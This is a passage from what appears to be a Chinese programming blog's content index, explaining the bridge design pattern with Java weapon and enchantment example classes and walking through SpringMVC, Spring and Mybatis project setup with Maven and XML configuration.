src=\"/images/old/20170920%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-20%E4%B8%8B%E5%8D%887.49.52.png\"></p>\n<span id=\"more\"></span>\n<p>采用桥接模式：<br><img src=\"/images/old/20170920%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-20%E4%B8%8B%E5%8D%888.06.56.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">**</span><br><span class=\"line\"> * 武器</span><br><span class=\"line\"> */</span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Weapon</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 轻攻击</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">lightAttack</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 重攻击</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">heavyAttack</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 附魔</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Enchantment</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 激活</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">onActivate</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 使用</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">apply</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 失效</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">onDeactivate</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 出血附魔</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">BleedingEnchantment</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Enchantment</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onActivate</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;激活出血效果&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">apply</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;出血伤害&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onDeactivate</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;取消出血效果&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 暴击附魔</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">StrikeEnchantment</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Enchantment</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onActivate</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;激活暴击效果&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">apply</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;暴击伤害&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onDeactivate</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;取消暴击效果&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 剑</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Sword</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Weapon</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//附魔</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Enchantment enchantment;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Sword</span><span class=\"params\">(Enchantment enchantment)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.enchantment = enchantment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">lightAttack</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (enchantment != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            enchantment.onActivate();</span><br><span class=\"line\">            enchantment.apply();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;剑轻攻击&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (enchantment != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            enchantment.onDeactivate();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">heavyAttack</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (enchantment != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            enchantment.onActivate();</span><br><span class=\"line\">            enchantment.apply();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;剑重攻击&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (enchantment != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            enchantment.onDeactivate();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 大锤</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Hammer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Weapon</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//附魔</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Enchantment enchantment;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Hammer</span><span class=\"params\">(Enchantment enchantment)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.enchantment = enchantment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">lightAttack</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (enchantment != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            enchantment.onActivate();</span><br><span class=\"line\">            enchantment.apply();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;大锤轻攻击&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (enchantment != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            enchantment.onDeactivate();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">heavyAttack</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (enchantment != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            enchantment.onActivate();</span><br><span class=\"line\">            enchantment.apply();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;大锤重攻击&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (enchantment != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            enchantment.onDeactivate();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Enchantment</span> <span class=\"variable\">strikeEnchantment</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StrikeEnchantment</span>();</span><br><span class=\"line\">        <span class=\"type\">Weapon</span> <span class=\"variable\">hammer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Hammer</span>(strikeEnchantment);</span><br><span class=\"line\">        hammer.heavyAttack();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Enchantment</span> <span class=\"variable\">bleedingEnchantment</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BleedingEnchantment</span>();</span><br><span class=\"line\">        <span class=\"type\">Weapon</span> <span class=\"variable\">sword</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Sword</span>(bleedingEnchantment);</span><br><span class=\"line\">        sword.lightAttack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Java中使用的桥接\"><a href=\"#Java中使用的桥接\" class=\"headerlink\" title=\"Java中使用的桥接\"></a>Java中使用的桥接</h3><p>java.util.logging.Handler中Formatter，采用的是桥接设计模式。<br><img src=\"/images/old/20170920%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-20%E4%B8%8B%E5%8D%888.49.05.png\"><br>Handler子类有ConsoleHandler、FileHandler、SocketHandler等<br><img src=\"/images/old/20170920%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-20%E4%B8%8B%E5%8D%888.52.39.png\"><br>Formatter子类有XMLFormatter、SimpleFormatter等</p>\n<p>在Handler子类中有实现publish中，有需要使用Formatter来格式化输出，如图<br><img src=\"/images/old/20170920%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-20%E4%B8%8B%E5%8D%888.55.23.png\"></p>\n<p>JDBC连接核心也是使用的桥接模式，如下：<br>Class.forName(“com.mysql.jdbc.Driver”);<br>DriverManager.getConnection(“url”);<br>在com.mysql.jdbc.Driver类加载的时候有个静态方法，把当前对象加载到DriverManager.registeredDrivers中<br>在使用getConnection的时候，获取到之前的驱动连接数据库。如图：<br><img src=\"/images/old/20170920%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-20%E4%B8%8B%E5%8D%889.05.37.png\"><br><img src=\"/images/old/20170920%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-20%E4%B8%8B%E5%8D%889.05.47.png\"></p>\n<p>JDBC连接桥接模式，相对之前，只是属性设置不一样。</p>\n<h3 id=\"桥接模式总结\"><a href=\"#桥接模式总结\" class=\"headerlink\" title=\"桥接模式总结\"></a>桥接模式总结</h3><p>桥接模式和适配器模式用于设计的不同阶段，桥接模式用于系统的初步设计，对于存在两个独立变化维度的类可以将其分为抽象化和实现化两个角色，使它们可以分别进行变化；而在初步设计完成之后，当发现系统与已有类无法协同工作时，可以采用适配器模式。但有时候在设计初期也需要考虑适配器模式，特别是那些涉及到大量第三方应用接口的情况。</p>\n<p>在软件开发中如果一个类或一个系统有多个变化维度时，都可以尝试使用桥接模式对其进行设计。桥接模式为多维度变化的系统提供了一套完整的解决方案，并且降低了系统的复杂度。</p>\n<p><strong>使用场景：</strong></p>\n<ul>\n<li>如果一个系统需要在抽象化和具体化之间增加更多的灵活性，避免在两个层次之间建立静态的继承关系，通过桥接模式可以使它们在抽象层建立一个关联关系。</li>\n<li>拆分后两部分互不影响。</li>\n<li>一个类有多个变化维度，且多个纬度都需要进行独立扩展。</li>\n<li>不希望使用多继承，导致类增多情况。</li>\n</ul>\n<p><strong>优点 ：</strong></p>\n<ul>\n<li>分离抽象接口及其实现部分，使各自都有自己子类，方便组合。</li>\n<li>在有的情况下可以取代多继承，多层继承方案违背了“单一职责原则”，复用性较差，且类的个数非常多，桥接模式是比多层继承方案更好的解决方法，它极大减少了子类的个数。</li>\n<li>桥接模式提高了系统的可扩展性，在两个变化维度中任意扩展一个维度，都不需要修改原有系统，符合“开闭原则”。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>桥接模式的使用会增加系统的理解与设计难度，由于关联关系建立在抽象层，要求开发者一开始就针对抽象层进行设计与编程。</li>\n<li>不容易识别系统的独立变化纬度，需要一定经验积累。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","桥接模式","Bridge Pattern"]},{"title":"SSM搭建讲解","url":"/2017/09/25/SSM%E6%90%AD%E5%BB%BA%E8%AE%B2%E8%A7%A3/","content":"<p>项目中常用SpringMVC+Spring+Mybatis搭建项目。各个配置讲解。</p>\n<h3 id=\"maven构建项目\"><a href=\"#maven构建项目\" class=\"headerlink\" title=\"maven构建项目\"></a>maven构建项目</h3><p>步骤：</p>\n<ol>\n<li>通过maven(maven-archetype-webapp)创建空白项目</li>\n<li>添加所需要的目录</li>\n<li>配置maven使用的相关插件</li>\n</ol>\n<ul>\n<li>使用maven-archetype-webapp可以快速创建web目录结构项目，省去自己创建相关目录<span id=\"more\"></span>\n操作：<br>创建空白项目后，添加日志依赖slf4j-log4j12；因为是web项目，想要添加servlet相关依赖：javax.servlet.servlet-api、javax.servlet.jsp.jsp-api、jstl、javax.servlet-api(web 3.0使用)；<blockquote>\n<p>注意点：servlet-api和jsp-api这个scope需要设置为provided，因为项目部署的容器中，一般都有这两个jar包。</p>\n</blockquote>\n</li>\n</ul>\n<p>在resources目录下添加日志配置文件log4j.properties：</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#简单配置日志</span></span><br><span class=\"line\"><span class=\"attr\">log4j.rootLogger</span>=<span class=\"string\">info, Console</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">#Console</span></span><br><span class=\"line\"><span class=\"attr\">log4j.appender.Console</span>=<span class=\"string\">org.apache.log4j.ConsoleAppender</span></span><br><span class=\"line\"><span class=\"attr\">log4j.appender.Console.layout</span>=<span class=\"string\">org.apache.log4j.PatternLayout</span></span><br><span class=\"line\"><span class=\"attr\">log4j.appender.Console.layout.ConversionPattern</span>=<span class=\"string\">%d [%t] %-5p [%c] - %m%n</span></span><br></pre></td></tr></table></figure>\n\n<p>添加插件org.apache.maven.plugins.maven-compiler-plugin、org.codehaus.mojo.tomcat-maven-plugin</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-compiler-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">source</span>&gt;</span>1.8<span class=\"tag\">&lt;/<span class=\"name\">source</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">target</span>&gt;</span>1.8<span class=\"tag\">&lt;/<span class=\"name\">target</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">encoding</span>&gt;</span>utf-8<span class=\"tag\">&lt;/<span class=\"name\">encoding</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.codehaus.mojo<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>tomcat-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">path</span>&gt;</span>/<span class=\"tag\">&lt;/<span class=\"name\">path</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">port</span>&gt;</span>8080<span class=\"tag\">&lt;/<span class=\"name\">port</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">uriEncoding</span>&gt;</span>utf-8<span class=\"tag\">&lt;/<span class=\"name\">uriEncoding</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">server</span>&gt;</span>tomcat7<span class=\"tag\">&lt;/<span class=\"name\">server</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>org.apache.maven.plugins.maven-compiler-plugin插件作用设置项目编译的jdk版本</li>\n<li>org.codehaus.mojo.tomcat-maven-plugin插件用于通过maven的tomcat插件直接启动项目。如果需要使用高版本tomcat，不建议使用该插件启动tomcat，该插件支持的tomcat插件版本较低。</li>\n</ul>\n<p>启动项目，访问localhost:8080查看项目启动是否正常。</p>\n<h3 id=\"添加SpringMVC\"><a href=\"#添加SpringMVC\" class=\"headerlink\" title=\"添加SpringMVC\"></a>添加SpringMVC</h3><p>步骤：</p>\n<ol>\n<li>配置web.xml</li>\n<li>配置SpringMVC配置文件</li>\n<li>启动访问Controller</li>\n</ol>\n<p>操作：<br>添加springmvc依赖，pom文件修改添加依赖org.springframework.spring-webmvc，webmvc依赖了常用的jar包，包括bean、context、aop等。<br>在默认的web.xml中约束需要修改为web-app_2_5.xsd（如果不修改为2.4以上在jsp页面需要写&lt;%@ page isELIgnored&#x3D;”false” %&gt; $才会生效）。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">web-app</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">version</span>=<span class=\"string\">&quot;2.5&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>配置servlet。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--配置Spring MVC--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!--配置SpringMVC配置文件路径，如果不配置默认为WEB-INF下面$&#123;servlet-name&#125;-servlet.xml--&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!--源码AbstractRefreshableConfigApplicationContext.getConfigLocations--&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">  &lt;init-param&gt;</span></span><br><span class=\"line\"><span class=\"comment\">    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span></span><br><span class=\"line\"><span class=\"comment\">    &lt;param-value&gt;classpath:&lt;/param-value&gt;</span></span><br><span class=\"line\"><span class=\"comment\">  &lt;/init-param&gt;</span></span><br><span class=\"line\"><span class=\"comment\">  --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>load-on-startup节点：</p>\n<blockquote>\n<ul>\n<li>load-on-startup元素标记容器是否在启动的时候就加载这个servlet(实例化并调用其init()方法)</li>\n<li>它的值必须是一个整数，表示servlet应该被载入的顺序</li>\n<li>当值为0或者大于0时，表示容器在应用启动时就加载并初始化这个servlet</li>\n<li>当值小于0或者没有指定时，则表示容器在该servlet被选择时才会去加载</li>\n<li>正数的值越小，该servlet的优先级越高，应用启动时就越先加载</li>\n<li>当值相同时，容器就会自己选择顺序来加载</li>\n</ul>\n</blockquote>\n<p>默认在WEB-INF添加spring-servlet.xml配置文件，配置spring扫描，配置视图解析器，配置静态资源，配置入出参UTF-8</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--Spring MVC配置--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">&quot;com.feiniu&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 对模型视图名称的解析,即对模型视图名称添加前后缀 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;viewResolver&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;prefix&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;/WEB-INF/jsp/&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;suffix&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;.jsp&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--静态资源文件位置--&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--由SimpleUrlHandlerMapping处理静态资源--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mvc:resources</span> <span class=\"attr\">mapping</span>=<span class=\"string\">&quot;/static/**&quot;</span> <span class=\"attr\">location</span>=<span class=\"string\">&quot;/static/&quot;</span>/&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!--解决返回乱码--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mvc:annotation-driven</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 消息转换器 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">mvc:message-converters</span> <span class=\"attr\">register-defaults</span>=<span class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;supportedMediaTypes&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">mvc:message-converters</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>添加Controller，添加jsp，添加js，看是否能正常访问。</p>\n<h4 id=\"Controller获取请求参数\"><a href=\"#Controller获取请求参数\" class=\"headerlink\" title=\"Controller获取请求参数\"></a>Controller获取请求参数</h4><blockquote>\n<p>CookieValue：获取cookie的值<br>ModelAttribute：表单提交封装对象<br>PathVariable：获取路径中的参数，和开发rest风格api同用<br>RequestBody：一般用户json请求<br>RequestParam：request请求中的值<br>SessionAttributes：session中的值<br>等其他注解</p>\n</blockquote>\n<h4 id=\"SpringMVC相关\"><a href=\"#SpringMVC相关\" class=\"headerlink\" title=\"SpringMVC相关\"></a>SpringMVC相关</h4><p>SpringMVC原理是定义一个Servlet，配置请求路径，之后相关请求会全部走到配置的DispatcherServlet，请求的url匹配到相关的Controller，默认SpringMVC的Controller是单例的，使用的时候需要注意线程安全。<br>源码阅读入口：</p>\n<ol>\n<li>SpringMVC启动：DispatcherServlet父类HttpServletBean.init（因为实现了Servlet，所以web容器会调用init初始化Servlet）</li>\n<li>请求到SpringMVC：doService</li>\n</ol>\n<h3 